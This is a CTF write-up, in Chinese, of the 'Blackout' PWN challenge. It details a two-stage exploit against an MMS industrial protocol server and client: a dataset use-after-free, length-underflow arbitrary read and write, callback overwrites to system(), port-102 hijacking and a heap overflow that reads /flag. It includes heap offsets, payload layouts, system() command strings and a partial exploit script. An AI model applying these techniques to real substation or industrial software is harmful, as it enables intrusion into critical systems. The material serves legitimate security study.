# Blackout（2026强网杯）

## 1. 题目信息

| 项目 | 内容 |
| --- | --- |
| 分类 | PWN |
| 形态 | 混合题（附件+靶机） |
| 附件 | Blackout.zip（bin/、filestore/、run.sh、Dockerfile、mlclient.conf） |
| 目标 | 容器 |

Flag：flag{动态容器已脱敏}

题面只有一句“只拿到第一个shell好像还不够”。这句话直接点出本题是两段式：先从外部打穿装置侧拿到`ied`权限，再借这个身份去攻击内部主站进程，因为`/flag`属于`oper`。

## 2. 题目分析

### 双身份结构

`run.sh`把两个守护进程分别降权拉起，并各自套了一个`while true`监督循环：

```bash
# 装置侧(ied)：MMS服务端，异常退出2秒后重启
setpriv --reuid=ied --regid=ied --init-groups \
    --inh-caps=+net_bind_service --ambient-caps=+net_bind_service \
    bash -c 'while true; do
        /srv/lib/server_sg5000 102 /srv/filestore >> /tmp/gwlog/gw.log 2>&1
        echo "[supervisor] device exited ($?), restart in 2s" >> /tmp/gwlog/gw.log
        sleep 2
    done' &

# 站控层(oper)：主站链路客户端，异常退出2秒后重启
setpriv --reuid=oper --regid=oper --init-groups \
    bash -c 'while true; do
        /srv/mlc/sg_masterlink >> /tmp/gwlog/mlclient-sup.log 2>&1
        echo "[supervisor] masterlink exited ($?), restart in 2s" >> /tmp/gwlog/mlclient-sup.log
        sleep 2
    done' &
```

`/flag`由`run.sh`以`root:oper 0440`写入，只有`oper`组可读。装置侧`ied`即使拿到shell也读不到flag，这是第一阶段必须继续往内打的原因。

`setpriv`给`ied`显式授予了`--inh-caps=+net_bind_service --ambient-caps=+net_bind_service`。这两个参数会让能力跨`execve`保留，因此`ied`进程派生出的任何子进程都能绑定小于1024的端口；而`server_sg5000`本身就监听`102`。这正是第二阶段的立足点：拿下`ied`后可以抢占`127.0.0.1:102`，而监督循环重启的`sg_masterlink`会主动连上来。

`mlclient.conf`给出了主站侧的全部关键参数：

```text
server 127.0.0.1 102
poll_ms 4000
disturbance_pickup 10000
unsafe_legacy_frame_mode 0
filestore /srv/mlc/data
log /srv/mlc/data/ml.log
```

`poll_ms 4000`说明`sg_masterlink`每4秒轮询一次，`log`指向`/srv/mlc/data/ml.log`，该日志会记录启动信息、libc路径、连接句柄，是第二阶段恢复地址的来源。

### 完整利用链

```text
外部MMS客户端
  -> server_sg5000(ied)动态数据集UAF + FileRead长度下溢
  -> 任意C字符串读 + 任意写
  -> 覆盖IsoConnection回调为system
  -> ied权限命令执行（继承CAP_NET_BIND_SERVICE）
  -> 抢占127.0.0.1:102并伪装MMS服务端
  -> sg_masterlink(oper)文件分片长度下溢导致堆溢出
  -> 覆盖报告回调为system
  -> 以oper身份读取/flag并写回文件区
```

### 关键偏移

| 项目 | 值 |
| --- | --- |
| ISO`B`相对`V` | `-0x248E0` |
| ISO`X`相对`V` | `-0x34810` |
| 悬空`entry` | `V+0xE70` |
| fake`ByteBuffer` | `B+0x2000` |
| 命令缓冲区 | `B+0x2100` |
| Stage1`r1.bin`长度 | `0x13F60` |
| Stage1`r2.bin`长度 | `0x11000` |
| `CotpConnection`发送窗口 | `77000` |
| `msgRcvdHandler` | `X+0x50` |
| `tickHandler` | `X+0x58` |
| `handlerParameter` | `X+0x60` |
| `reportHandler` | `H+0x88` |
| `reportHandlerParam` | `H+0x90` |
| response缓冲区落点 | `H+0x78` |
| Stage2命令在payload内偏移 | `0xC0` |
| Stage2溢出文件长度 | `65112` |
| Stage2发送缓冲区长度 | `65100` |
| 下溢后的chunk大小 | `0xFFFFFFEC` |

## 3. 解题过程

### 信息收集

附件里只有二进制和配置，没有源码。先确认几个静态事实：

- `server_sg5000`动态链接`libsgcomm.so.2`，该库实现了完整的MMS协议栈（BER编解码、COTP分片、文件服务、报告服务）。
- `sg_masterlink`是静态链接了同一套协议栈的主站客户端，配置文件写死连`127.0.0.1:102`。
- `server_sg5000`不做认证，任何客户端都能建立MMS关联，直接读写变量、读写文件、上传文件。
- 装置文件区`/srv/filestore`对`ied`可写，`ObtainFile`可以把攻击者文件写进去；`sg_masterlink`的文件区是`/srv/mlc/data`，两者不在同一目录。

可攻击的面集中在四处：动态命名变量列表（`define_named_variable_list`）与RCB引用关系、`FileRead`的长度计算、`InitiateRequest`里的`maxPduSize`、以及`ObtainFile`上传。

### Stage1：崩溃重启与首关联竞态

利用要依赖“刚启动、堆布局干净”的进程状态，所以先主动把服务打崩一次。

向`TL5`逻辑设备下的`TSNC$SP$TsynReq$ReqStr`写入一个构造值，`TsynReq`处理函数会把这个值当成同步请求指针解引用，产生空指针访问，`server_sg5000`退出。监督循环在2秒后重启它。

重启后的窗口里立刻循环`connect`，目标只有一个：成为新进程的第一条MMS关联。第一条关联创建的`IsoConnection`、`CotpConnection`和收发缓冲区会按照固定的顺序从刚初始化的arena里切出来，后续所有偏移都基于这个顺序；如果中间插进了别的连接，堆上就多出一批对象，`B`、`X`这些基址的相对关系全部失效。

判断是否抢到首关联的办法是看UAF泄漏长度：抢到时泄漏稳定为5字节，不是5字节就再崩一次重来。

### 动态数据集UAF

装置侧允许在线创建“动态命名变量列表”（DataSet），并允许把报告控制块（RCB）的`DatSet`属性指向它。正常流程是：

```text
define_named_variable_list(TL0, LLN0$assetds, ENTRY)
write LLN0$RP$urcLd0Ev$DatSet = TL0/LLN0$assetds
write LLN0$RP$urcLd0Ev$OptFlds  = 0x1C
write LLN0$RP$urcLd0Ev$TrgOps   = 0x4C
write LLN0$RP$urcLd0Ev$RptEna   = true
```

删除数据集时，代码需要先确认没有RCB还引用它。这段检查用字符串长度参与比较，而RCB里保存的引用是`TL0/LLN0$assetds`，数据集自身登记的名字是`LLN0$assetds`，两者长度不同，检查因此漏判：引用计数被算成0，数据集对象被`free`掉，但RCB的`DatSet`字段仍然指向那块已释放内存。

紧接着写`LLN0$RP$urcLd0Ev$GI = true`强制触发一次总召报告，报告生成路径从RCB取出`DatSet`指针，按数据集项逐条读取`DataReference`。此时读到的是已释放块里的内容，于是形成UAF读：报告响应中的`DataReference`字段会把释放块里的数据当字符串带出来。

为了稳定，删除前先创建7个长名字的命名变量列表做堆整形：

```python
for i in range(7):
    name = ("F%02d" % i).encode() + b"A" * 29     # 31字节名字
    obj = tlv(0xA1, tlv(0x1A, b"TL4") + tlv(0x1A, b"GGIOM"))
    c.define_raw(name, tlv(0x30, tlv(0xA0, obj)))
```

这些对象和数据集项同尺寸，先占满tcache再释放，可使被释放的`DataSetEntry`落在可预测的arena页上，并且让它的前5字节保留一个ISO arena页号。

### 堆布局推导

泄漏回来的5字节是页内偏移的低位，配合16进制页对齐即可还原`V`：

```python
V = (int.from_bytes(leak, "little") << 12) | 0x3C0
B = V - 0x248E0        # ISO发送缓冲区相关基址
X = V - 0x34810        # IsoConnection对象基址
entry = V + 0xE70      # 被释放的DataSetEntry
DSET = entry - 0x30
```

`V`之所以用`| 0x3C0`修正，是因为泄漏值只保留了页内偏移的高位部分，低12位被清零后再补回该arena块固定的0x3C0页内偏移。`B`是发送缓冲区对象（`ByteBuffer`）所在的基址，`X`是连接对象基址，两者与`V`的差值由该版本`libsgcomm.so.2`的分配顺序决定，换库即失效。

### 伪造ByteBuffer与任意读

先通过`ObtainFile`上传一个长度`0x13F60`的文件`rc.bin`，这个文件本身就是一份堆布局：它在被读入发送缓冲区时，会把紧随其后的`CotpConnection`字段整体改写。

触发条件有两个：

1. 发送`InitiateRequest`，把`maxPduSize`设成`16`。协商出的PDU上限极小，后续`FileRead`在计算“还能发多少”时会出现负数，负数被当成无符号大数使用。
2. 对该文件发`FileRead`。响应路径按协商值裁剪分片，裁剪结果越界，写入点落到`CotpConnection`。

构造的目标状态：

```text
payload      -> B + 0x2000        # 伪造的ByteBuffer
buffer       -> entry - user_off  # 接收写入起点对准悬空DataSetEntry
maxSize      -> 0x100000
size         -> 0
socket       -> 原值
handleSet    -> 原值
extBuf       -> 原值
```

`user_off`由报文头长度决定，本题的TPKT+COTP+MMS头合计`0x13`字节，所以`buffer`取`entry - 0x13`；脚本里所有写入都统一走`put_addr(addr, data) -> put(buf, addr - 0x13, data)`。

`CotpConnection`中需要保持原值的是`socket`和`handleSet`，它们参与后续收发；`mutex`区域写0，保证解锁路径正常；`writeBuffer`指向`B+0x2000`的伪造`ByteBuffer`，`payload`指向`B+0x8000`，`size`清零让下一次发送重新填充。

布局生效后，再发一个两项`Write`：

1. 第一项把构造内容当作domain标识发过去，服务端解析时把其中`0x38`字节当作数据集项补丁写进`entry`，修复被释放项的`type`、`count`等字段，并把`variableName`指针改成待读地址。
2. 第二项写`LLN0$RP$urcLd0Ev$GI = true`，同一轮通信里触发报告。

报告生成时把`variableName`当C字符串读取，`DataReference`就变成了“任意地址的C字符串”，这就是任意读原语。读一次只需要换`target`、重传`rc.bin`、重发`Initiate(16)`+`FileRead`+两项`Write`。

### 泄漏libsgcomm与libc

第一个目标是`X+0x50`处的`msgRcvdHandler`，它是`libsgcomm.so.2`里的函数指针：

```text
libsg = msgRcvdHandler - 0x45A10
```

有了`libsg`，再读`libsg+0xCA150`处的`free@GOT`，得到libc里的`free`实际地址。libc基址用“候选值回读ELF头”的方式确认：把`free_addr - 候选偏移`按页对齐，读该地址前4字节，只有等于`\x7fELF`才接受，避免拿到错误的候选基址。

| 项目 | 偏移 |
| --- | --- |
| `msgRcvdHandler` | `0x45A10` |
| `free@GOT` | `0xCA150` |
| glibc 2.35`free` | `0xA53A0` |
| glibc 2.35`system` | `0x50D70` |
| glibc 2.39`free` | `0xADE30` |
| glibc 2.39`system` | `0x58750` |

镜像为Ubuntu 22.04时命中2.35两行；若平台换成glibc 2.39镜像，同样用`free`低12位在表中匹配。

### 覆盖IsoConnection回调

拿到`system`后，用同一套`FileRead`越界写两次完成控制流劫持。

第一次读`r1.bin`（`0x13F60`字节）：重写`CotpConnection`，`mutex`写0保持可解锁，`writeBuffer`指向伪造的`ByteBuffer`（`B+0x2000`），`payload`指向`X+0x08`，`size`给`77000`。

第二次读`r2.bin`（`0x11000`字节）：响应远大于`maxPduSize`，进入COTP分片发送，伪造的`ByteBuffer`把后续分片重定向到`IsoConnection`（`X`）。分片按偏移落位，缓冲区偏移`65512`、`65520`、`65528`三个位置依次覆盖：

```text
X+0x50: msgRcvdHandler   = system
X+0x58: tickHandler      = system
X+0x60: handlerParameter = B+0x2100（命令字符串）
```

`IsoConnection`所在线程每轮都会调用定时回调，`tickHandler`被换成`system`后，`handlerParameter`作为唯一参数被传入，于是执行：

```text
system("pkill -9 -f '[s]erver_sg5000'; nohup python3 /srv/filestore/stage2.py >/dev/null 2>&1 &")
```

命令在`ied`上下文执行，继承了`CAP_NET_BIND_SERVICE`。它先杀掉真实的装置服务，避免监督循环把`102`端口抢回去，然后拉起第二阶段脚本。

### Stage2：抢占内部MMS端口

`stage2.py`用`ied`身份`bind(("127.0.0.1", 102))`。`sg_masterlink`的监督循环此时会重启客户端，客户端读配置连`127.0.0.1:102`，连上的就是攻击者的伪服务端。攻击对象从“装置服务”换成了“`oper`权限的MMS客户端”。

握手阶段返回一个刻意构造的`InitiateResponse`：

```text
local-detail-calling = 0
```

`sg_masterlink`用这个值算“本次关联允许的最大文件分片”：

```text
maxFileChunkSize = local-detail-calling - 0x14 = 0xFFFFFFEC
```

该值是有符号32位，参与`fread()`长度计算时被当成巨大的无符号数，于是“读一个分片”变成“把整个报告文件读进约`65100`字节的发送缓冲区”，形成可控制的堆溢出。

### 文件分片下溢与报告文件溢出

溢出点必须落在“持久化响应`ByteBuffer`”上，而这个布局只有在`IsoClientConnection`创建于刚启动的`sg_masterlink`进程里时才成立。所以`stage2.py`会检查当前连接是不是该进程的第一条关联：不是就故意不回响应，让主站侧超时退出、监督循环重启，等下一条来自新进程的连接。

地址来源是`/srv/mlc/data/ml.log`。伪服务端通过文件服务把`ml.log`读回来，解析出：

- 主站PIE基址；
- libc基址与libc路径；
- 当前`MmsConnection`句柄`H`；
- 关联号与启动时间戳。

句柄必须取自“当前新进程的最新一次启动记录”，且时间戳不早于当前TCP连接的建立时间，否则用的是上一个进程的堆地址，写过去只会让客户端崩溃。`system`偏移仍按`free`低12位在偏移表里选。

`sg_masterlink`会把收到的`InformationReport`追加写进`rec-N.jrn`。`stage2.py`先探测哪个slot可写、首次写入是否会把文件截断，再准备两个文件：

- `overflow.bin`长`65112`字节，刚好越过约`65100`字节的发送缓冲区，尾部覆盖持久化响应`ByteBuffer`的`buffer`指针；
- `payload.bin`长`256`字节，含`system`、命令指针和命令字符串。

overflow文件尾部布局：

```python
prefix = b"\x00" * (65088 - current_size)
body = prefix + p64(0) + p64(0x21) + p64(H + 0x78)
```

`prefix`把前面已有内容补齐到65512字节之前的位置，`p64(0)+p64(0x21)`伪造一个大小为`0x20`的chunk头，`p64(H+0x78)`覆盖`buffer`指针。读完后，响应缓冲区起点变成`H+0x78`。

payload文件则从`H+0x88`开始落位：

```text
H+0x88: reportHandler      = system
H+0x90: reportHandlerParam = H+0x148
H+0x148: 命令字符串
```

`H+0x78`到`H+0x88`之间16字节被MMS响应头占用，正好跳过，payload从`reportHandler`开始覆盖。

### 触发回调并取回flag

顺序不能乱：

```text
打开overflow.bin -> FileRead 65112字节 -> response->buffer = H+0x78
打开payload.bin  -> FileRead 256字节   -> 覆盖H+0x88 / H+0x90
发送InformationReport -> reportHandler(reportHandlerParameter)
```

回调执行：

```text
system("cat /flag > /srv/filestore/out.txt; chmod 666 /srv/filestore/out.txt")
```

命令以`oper`身份运行，`/flag`可读，输出写进装置文件区（`ied`可写、外部MMS文件服务可读）。辅助脚本确认文件出现后重启真实的`server_sg5000`，外层EXP重新关联，通过`FileRead`把`out.txt`读回来并打印flag。

## 4. PoC

```python
def tlv(tag, content):
    if isinstance(tag, int):
        tag = bytes([tag])
    return tag + ber_len(len(content)) + content


# ...
def main():
    host = HOST
    port = int(sys.argv[1])
    c = None
    for _ in range(6):
        crash(host, port)
        try:
            c = race_first_connection(host, port)
            leak = trigger_uaf(c)
        except (OSError, EOFError, RuntimeError):
            continue
        if len(leak) != 5:
            c.close()
            continue

        lay = derive_layout(leak)
        arb_read(c, lay, lay["entry"])          # 先用一次读确认布局可用
        libsg, libc_base, free_off = leak_libraries(c, lay)
        system = libc_base + (0x50D70 if free_off == 0xA53A0 else 0x58750)

        cmd = ("pkill -9 -f '[s]erver_sg5000'; "
               "nohup python3 /srv/filestore/stage2.py >/dev/null 2>&1 &")
        r1, r2 = build_rce_files(lay["X"], lay["B"], system, cmd)
        c.upload("/r1.bin", r1)
        c.upload("/r2.bin", r2)
        with open("stage2.py", "rb") as f:
            c.upload("/stage2.py", f.read())
        fire_rce(c)
        c.close()
        break

    flag = read_flag(host, port)
    print("FLAG:", flag)

if __name__ == "__main__":
    main()


```
